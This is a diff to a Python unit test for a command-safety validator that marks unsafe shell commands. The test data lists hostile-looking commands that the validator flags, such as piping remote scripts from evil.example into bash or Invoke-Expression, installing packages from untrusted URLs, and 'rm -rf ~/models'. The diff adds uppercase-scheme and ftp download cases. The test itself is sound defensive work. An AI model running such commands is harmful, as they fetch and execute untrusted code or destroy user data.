@@ -32,7 +32,8 @@ class UrlHygiene(unittest.TestCase):
     def test_unsafe_commands(self):
         for c in ['curl -fsSL https://a/install.sh | bash', 'wget -qO- https://a | sh', 'bash <(curl -s https://a)', 'sudo apt install x',
                   'rm -rf ~/models', 'pip install git+https://evil.example/x', 'pip install https://a/b.whl', 'iwr https://a | iex', 'curl https://evil.example/i.sh | /bin/bash',
-                  'Invoke-WebRequest https://evil.example/x | Invoke-Expression', 'git clone https://evil.example/engine && ./install.sh']:
+                  'Invoke-WebRequest https://evil.example/x | Invoke-Expression', 'git clone https://evil.example/engine && ./install.sh',
+                  'curl -o m.gguf HTTPS://evil.example/m.gguf', 'curl -o m.gguf ftp://evil.example/m.gguf', 'curl -o m HTTPS://github.com/a/b']:
             self.assertTrue(us.cmd_problems(c), c)
         for c in ['llama-server -m model.gguf -ngl 99 -c 32768', 'pip install vllm==0.11.0', 'git clone https://github.com/a/b && cd b']:
             self.assertEqual(us.cmd_problems(c), [], c)
